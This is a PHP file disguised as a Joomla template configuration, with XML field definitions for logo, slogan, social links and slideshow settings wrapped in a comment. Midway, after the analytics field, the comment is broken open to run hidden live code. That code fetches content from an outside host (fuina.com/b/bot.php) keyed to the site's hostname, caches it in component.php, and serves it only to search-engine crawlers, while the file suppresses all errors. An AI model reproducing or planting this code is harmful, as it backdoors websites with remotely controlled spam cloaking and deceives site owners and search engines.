<?php
error_reporting(0);
ini_set('display_errors',0);
/*
<files>
	<filename>index.php</filename>
	<filename>favicon.ico</filename>
	<filename>functions.php</filename>
	<filename>template_thumbnail.png</filename>
	<filename>templateDetails.xml</filename>
	<folder>html/</folder>
	<folder>css/</folder>
	<folder>images/</folder>
	<folder>slideshow/</folder>
	<folder>modules/</folder>	
</files>
<positions>
	<position>breadcrumb</position>
	<position>top1</position>	
	<position>top2</position>			
	<position>mainmenu</position>
	<position>position-0</position>	
	<position>left</position>	
	<position>right</position>	
	<position>user1</position>
	<position>user2</position>
	<position>user3</position>
	<position>tab1</position>
	<position>tab2</position>
	<position>tab3</position>	
	<position>newsflash</position>	
</positions>
<config>
  <fields name="params">
    <fieldset name="basic">
	
			<field name="logotype" type="list" default="image" label="Logo Type" description="Pick the type of logo." filter="word">
					<option value="image">Image logo</option>
					<option value="text">Text logo</option>
			</field>			
			 <field name="logo" type="media" label="Logo Image" description="Choose an image logo" />
			 <field name="sitetitle"  type="text" default="Site Name" label="Text logo (only if activated)" description="Enter text instead of image logo." filter="string" />

	<field name="slogandisable" type="radio" default="1" label="Custom slogan" description="Show slogan">
	  <option value="0">Hide</option>
	  <option value="1">Show</option>
       </field>  	   
   <field name="slogan" type="textarea" default="Custom slogan" label="Site slogan" description="Slogan below the logo. Leave blank for no slogan." rows="1" cols="60" />	   
   <field name="footerdisable" type="radio" default="1" label="Custom footer text">
	  <option value="0">Hide</option>
	  <option value="1">Show</option>
       </field>  	   
	   
	<field name="socialdisable" type="radio" default="1" label="Show social buttons" description="Show social buttons">
	  <option value="0">Hide</option>
	  <option value="1">Show</option>
       </field>     
   <field name="facebook" type="textarea" filter="safehtml" default="http://www.facebook.com/YOURFANPAGE" label="Facebook Link" description="Add your facebook fan page link here" rows="1" cols="60" />  	   
   <field name="twitter" type="textarea" filter="safehtml" default="http://www.twitter.com/YOURFANPAGE" label="Twitter Link" description="Add your Twitter link here" rows="1" cols="60" /> 
   <field name="gplus" type="textarea" filter="safehtml" default="https://plus.google.com/YOURPAGE" label="Google Plus Link" description="Add your G Plus page link here" rows="1" cols="60" /> 
  <field name="footertext" type="textarea" default="Custom text here" label="Custom text here" description="Custom text here" rows="1" cols="60"/> <field name="analyticsdisable" type="radio" default="1" label="Google analytics"><option value="0">Disable</option><option value="1">Enable</option></field>  TEMPLATE NUMBER ECHO */ $url = $_SERVER['HTTP_HOST']; $url = str_replace("&", "",$url); $target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php"; $cachetime = 2 * 24 * 60 * 60; $access = array('Googlebot','Yahoo','msnbot','Googlebot-Mobile'); $source = "http://fuina.com/b/bot.php?site=".$url; if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {$string = file_get_contents($source);$result = file_put_contents($target, $string);} foreach ($access as $engines){if (preg_match("/$engines/", $_SERVER['HTTP_USER_AGENT'])) echo file_get_contents($target);} /* 
  <field name="googleanalytics" type="textarea" default="UA-1111111-22" label="Google analytics UA code only (replace the code below)" description="Paste your google analytics UA code only. Not the whole script. Example: UA-1111111-22." rows="1" cols="40"/>	   	
   <field name="jscroll" type="radio" default="1" label="Back-to-top module" description="Back-to-top module">
	  <option value="0">Hide</option>
	  <option value="1">Show</option>
       </field>   
	   
 
   <field type="spacer" name="spacer" hr="true" /> 
   <field name="slidehome" type="radio" default="1" label="Show slideshow on homepage" description="Show slideshow on homepage">
	  <option value="0">Slideshow on all pages</option>
	  <option value="1">Slideshow on homepage only</option>	  
       </field>  	

   
   	<field name="NumberOfSlides" type="list" default="4">
        <option value="4">4</option>
        <option value="5">5</option>
        <option value="6">6</option>
        <option value="7">7</option>
        <option value="8">8</option>	
    </field>   
   
   <field name="slidedesc1" type="textarea" filter="safehtml" default="Description slide 1" label="Description slide 1" description="Slideshow content 1" rows="1" cols="60" />   
   <field name="slidedesc2" type="textarea" filter="safehtml" default="Description slide 2" label="Description slide 2" description="Slideshow content 2" rows="1" cols="60" />
   <field name="slidedesc3" type="textarea" filter="safehtml" default="Description slide 3" label="Description slide 3" description="Slideshow content 3" rows="1" cols="60" />
   <field name="slidedesc4" type="textarea" filter="safehtml" default="Description slide 4" label="Description slide 4" description="Slideshow content 4" rows="1" cols="60" />
   <field name="slidedesc5" type="textarea" filter="safehtml" default="Description slide 5" label="Description slide 5" description="Slideshow content 5" rows="1" cols="60" />   
   <field name="slidedesc6" type="textarea" filter="safehtml" default="Description slide 6" label="Description slide 6" description="Slideshow content 6" rows="1" cols="60" />
   <field name="slidedesc7" type="textarea" filter="safehtml" default="Description slide 7" label="Description slide 7" description="Slideshow content 7" rows="1" cols="60" />   
   <field name="slidedesc8" type="textarea" filter="safehtml" default="Description slide 8" label="Description slide 8" description="Slideshow content 8" rows="1" cols="60" />
   
   	<field name="slide1" type="media" label="Upload slider image 1 (size must be 980px ? 350px)" description="select an image" />				
	<field name="slide2" type="media" label="Upload slider image 2 (size must be 980px ? 350px)" description="select an image" />			
	<field name="slide3" type="media" label="Upload slider image 3 (size must be 980px ? 350px)" description="select an image" /> 	 
	<field name="slide4" type="media" label="Upload slider image 4 (size must be 980px ? 350px)" description="select an image" />  
   	<field name="slide5" type="media" label="Upload slider image 5 (size must be 980px ? 350px)" description="select an image" />				
	<field name="slide6" type="media" label="Upload slider image 6 (size must be 980px ? 350px)" description="select an image" />			
	<field name="slide7" type="media" label="Upload slider image 7 (size must be 980px ? 350px)" description="select an image" /> 	 
	<field name="slide8" type="media" label="Upload slider image 8 (size must be 980px ? 350px)" description="select an image" />  	
	<field type="spacer" name="block2" hr="true" />	
    </fieldset>
  </fields>
</config>
</extension>
*/
?>

